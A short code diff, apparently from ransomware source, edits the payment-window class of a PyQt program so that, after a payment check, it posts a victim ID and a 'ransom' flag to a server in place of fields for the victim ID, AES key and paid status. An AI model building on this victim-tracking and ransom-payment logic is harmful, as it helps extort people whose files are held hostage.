@@ -87,9 +87,8 @@ class Pay_window(QMainWindow, Ui_PayWindow):
                     return
                 wait_time += 1
                 data = {
-                        'victim_id': victim_id,
-                        'AES_key': 'None',
-                        'paid': True
+                        "id": victim_id,
+                        "ransom": "true"
                 }
                 return post_server(data)
             cancel_order(out_trade_no, cancel_time)
